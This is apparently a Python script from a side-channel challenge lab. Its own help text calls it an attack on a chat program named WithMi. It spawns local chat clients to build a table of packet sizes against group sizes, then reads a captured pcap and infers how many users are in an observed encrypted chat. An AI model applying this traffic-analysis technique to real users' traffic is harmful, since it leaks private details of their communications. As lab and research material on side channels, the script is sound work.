import argparse
import json
import packetcollector
import processcommspackets
import collections
import pexpect
import time

SMALLEST_CHAT_SIZE = 447
ALLOWED_DIFF = 50

def main():
    parser = argparse.ArgumentParser(description="used to attack withmi")
    parser.add_argument("host", help="our host")
    parser.add_argument("port", type=int, help="our port")
    parser.add_argument("pcap", help="pcap file of observed chat session")
    parser.add_argument("--db", help="database file to read")
    parser.add_argument("--build", help="build database with given name")
    args = parser.parse_args()
    db = ChatNumberDb()
    if not args.db and args.build:
        db.build("lo")
        db.save(args.build)
    elif args.db:
        db.load(args.db)
    else:
        raise Exception("Must specify a database file to read OR a file where a database will be created")

    pcap = processcommspackets.read_pcap(args.pcap)

    # run the actual attack
    find_chat_sizes(pcap, db, args.host, args.port)

def find_chat_sizes(pcap, chatnumdb, host, port):
    # collect the messages in the pcap file
    msgs =[]
    conversations = processcommspackets.get_conversations(pcap, host, port)
    for id, conversation in conversations.items():
        msgs.extend(conversation.get_messages_without_setup())
    # get the sizes of the various chat state messages
    sizes = extract_chatstate_sizes(msgs)

    # there should only be one size in this attack
    for num_ppl_in_chat, chatstate_size in chatnumdb.chat_size_map.items():
        # loop through all chat sizes and compare them to our chat size
        # our chat size might be a little different, but still contain the same
        # number of users
        for size in sizes:
            if abs(size - chatstate_size) < ALLOWED_DIFF:
                print "There are " + str(num_ppl_in_chat) + " users in a chat"



def extract_chatstate_sizes(messages):
    chatstate_sizes = []
    for message in messages:
        if message.is_client() and (message.get_size() >= (SMALLEST_CHAT_SIZE - ALLOWED_DIFF)):
            chatstate_sizes.append(message.get_size())
    return chatstate_sizes

class ChatNumberDb(object):

    def __init__(self):
        self.host_address = "127.0.0.1"
        self.host_name = "localhost"
        # megan's port
        self.port_to_watch = 9002
        self.chat_size_map = collections.OrderedDict()


    def build(self, interface):
        """
        Builds a database of chatstate packet size and the number of people
        in the chat
        :param interface:
        :return:
        """
        msgs = []
        with packetcollector.PacketCollector(interface, "tcp port {}".format(self.port_to_watch)) as packet_collector:
            self.collect_data()
            time.sleep(10)
            packet_collector.stop()
            pcap = packet_collector.get_pcap()
            conversations = processcommspackets.get_conversations(pcap, self.host_address, self.port_to_watch)
            for id, conversation in conversations.items():
                msgs.extend(conversation.get_messages_without_setup())
            deltas = processcommspackets.get_time_deltas_for_messages(msgs)
            print "\n".join([str(delta) for delta in deltas])
            chat_sizes = extract_chatstate_sizes(msgs)
            num_of_users_in_chat = 2
            for size in chat_sizes:
                self.chat_size_map[num_of_users_in_chat] = size
                num_of_users_in_chat += 1

    def save(self, db_filename):
        """
        Saves the database to the file
        :param db_filename:
        :return:
        """
        with open(db_filename, 'w') as db:
            dic = {"chatstate_sizes": self.chat_size_map}
            json.dump(dic, db)

    def load(self, db_filename):
        """
        Loads the database from a file
        :param db_filename:
        :return:
        """
        with open(db_filename, 'r') as db:
            dic = json.load(db)
            self.chat_size_map = collections.OrderedDict(dic["chatstate_sizes"])

    def collect_data(self):
        sally = pexpect.spawn("../../../challenge_program/bin/withmi -d ../../../challenge_program/data -s ../../../challenge_program/data/temp/sally -i ../../../examples/sally.id")
        sally.expect("WithMi>")
        sally.sendline("createchat everyone")

        # create megan and have sally connect and add them to the chat
        megan =  pexpect.spawn("../../../challenge_program/bin/withmi -d ../../../challenge_program/data -s ../../../challenge_program/data/temp/megan -i ../../../examples/megan.id")
        megan.expect("WithMi>")
        sally.sendline("connect localhost 9002")
        sally.expect("megan")
        sally.expect("WithMi>")
        sally.sendline("adduser megan")
        sally.expect("Added user to group")
        time.sleep(20)

        # create deven and have sally connect and add them to the chat
        deven = pexpect.spawn("../../../challenge_program/bin/withmi -d ../../../challenge_program/data -s ../../../challenge_program/data/temp/deven -i ../../../examples/deven.id")
        deven.expect("WithMi>")
        sally.sendline("connect localhost 9001")
        sally.expect("deven")
        sally.expect("WithMi>")
        sally.sendline("adduser deven")
        sally.expect("Added user to group")
        time.sleep(20)

        # create maria and have sally connect and add them to the chat
        maria = pexpect.spawn("../../../challenge_program/bin/withmi -d ../../../challenge_program/data -s ../../../challenge_program/data/temp/maria -i maria.id")
        maria.expect("WithMi>")
        time.sleep(1)
        sally.sendline("connect localhost 9004")
        sally.expect("maria")
        sally.expect("WithMi>")
        sally.sendline("adduser maria")
        time.sleep(20)

        # create joe and have sally connect and add them to the chat
        joe = pexpect.spawn("../../../challenge_program/bin/withmi -d ../../../challenge_program/data -s ../../../challenge_program/data/temp/joe -i joe.id")
        joe.expect("WithMi>")
        sally.sendline("connect localhost 9005")
        sally.expect("joe")
        sally.expect("WithMi>")
        sally.sendline("adduser joe")
        time.sleep(20)


        sally.sendline("exit")
        deven.sendline("exit")
        megan.sendline("exit")
        joe.sendline("exit")
        maria.sendline("exit")


if __name__ == "__main__":
    main()

